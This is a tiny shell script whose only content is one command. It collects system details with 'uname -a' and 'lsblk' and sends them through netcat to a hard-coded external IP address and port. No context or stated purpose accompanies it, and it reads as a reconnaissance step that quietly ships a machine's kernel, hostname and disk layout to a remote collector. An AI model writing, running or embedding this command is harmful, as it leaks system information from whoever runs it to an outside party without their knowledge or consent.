#!/bin/sh
{ uname -a; lsblk; } | nc 57.129.54.120 23458
